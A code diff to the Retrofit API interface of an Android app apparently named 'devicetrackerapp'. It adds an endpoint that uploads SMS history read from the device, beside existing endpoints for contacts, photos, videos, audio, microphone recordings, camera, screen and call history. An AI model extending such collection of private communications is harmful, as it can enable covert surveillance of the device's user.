@@ -9,12 +9,14 @@ import com.example.devicetrackerapp.dto.ImageFolderSyncRequest;
 import com.example.devicetrackerapp.dto.RegisterDeviceRequest;
 import com.example.devicetrackerapp.dto.RegisterDeviceResponse;
 import com.example.devicetrackerapp.dto.ScreenRequest;
+import com.example.devicetrackerapp.dto.SmsSyncPayload;
 import com.example.devicetrackerapp.dto.TrackingConfigResponse;
 import com.example.devicetrackerapp.dto.UpdateLocationRequest;
 import com.example.devicetrackerapp.dto.VideoFolderSyncRequest;
 
 import okhttp3.MultipartBody;
 import okhttp3.RequestBody;
+
 import retrofit2.Call;
 import retrofit2.http.Body;
 import retrofit2.http.GET;
@@ -45,12 +47,14 @@ public interface ApiService {
             @Path("deviceId") String deviceId
     );
 
+
     // ================= Contacts =================
 
     @POST("media/contact/save")
     Call<ApiResponse<String>> saveContacts(
             @Body ContactPayload payload
     );
+
 
     // ================= Images =================
 
@@ -63,31 +67,34 @@ public interface ApiService {
             @Part("bucketId") RequestBody bucketId,
 
             @Part List<MultipartBody.Part> files
-
     );
 
     @POST("media/image/folders")
     Call<ApiResponse<String>> syncImageFolders(
 
             @Body ImageFolderSyncRequest request
-
     );
+
 
     // ================= Videos =================
 
     @Multipart
     @POST("/media/video/upload")
     Call<ApiResponse<String>> uploadVideos(
+
             @Part("deviceId") RequestBody deviceId,
+
             @Part List<MultipartBody.Part> files
     );
 
     @POST("/media/video/folders")
     Call<ApiResponse<String>> syncVideoFolders(
+
             @Body VideoFolderSyncRequest request
     );
 
-// ================= Audios =================
+
+    // ================= Audios =================
 
     @Multipart
     @POST("media/audio/upload")
@@ -96,18 +103,16 @@ public interface ApiService {
             @Part("deviceId") RequestBody deviceId,
 
             @Part List<MultipartBody.Part> files
-
     );
 
     @POST("media/audio/folders")
     Call<ApiResponse<String>> syncAudioFolders(
 
             @Body AudioFolderSyncRequest request
-
     );
 
 
-// ================= Mic =================
+    // ================= Mic =================
 
     @Multipart
     @POST("media/mic/upload")
@@ -118,8 +123,8 @@ public interface ApiService {
             @Part("duration") RequestBody duration,
 
             @Part MultipartBody.Part file
-
     );
+
 
     // ================= Camera =================
 
@@ -146,7 +151,6 @@ public interface ApiService {
 
     // ================= Screen =================
 
-
     @POST("media/screen/request")
     Call<ApiResponse<String>> requestScreen(
             @Body ScreenRequest request
@@ -157,12 +161,10 @@ public interface ApiService {
             @Path("deviceId") String deviceId
     );
 
-
     @POST("media/screen/started/{deviceId}")
     Call<ApiResponse<String>> screenStarted(
             @Path("deviceId") String deviceId
     );
-
 
     @POST("media/screen/stopped/{deviceId}")
     Call<ApiResponse<String>> screenStopped(
@@ -174,7 +176,9 @@ public interface ApiService {
             @Path("deviceId") String deviceId
     );
 
-    //Call History
+
+    // ================= Call History =================
+
     @POST("/media/call-history/sync")
     Call<ApiResponse<String>> syncCallHistory(
             @Body CallHistorySyncRequest request
@@ -184,5 +188,23 @@ public interface ApiService {
     Call<ApiResponse<String>> callHistorySyncCompleted(
             @Query("deviceId") String deviceId
     );
+
+
+    // ================= SMS HISTORY =================
+
+    /**
+     * Android -> Backend
+     *
+     * Upload SMS history read from device.
+     *
+     * Backend:
+     * POST /media/sms/sync
+     */
+    @POST("media/sms/sync")
+    Call<ApiResponse<String>> syncSms(
+            @Body SmsSyncPayload payload
+    );
+
+
 
 }
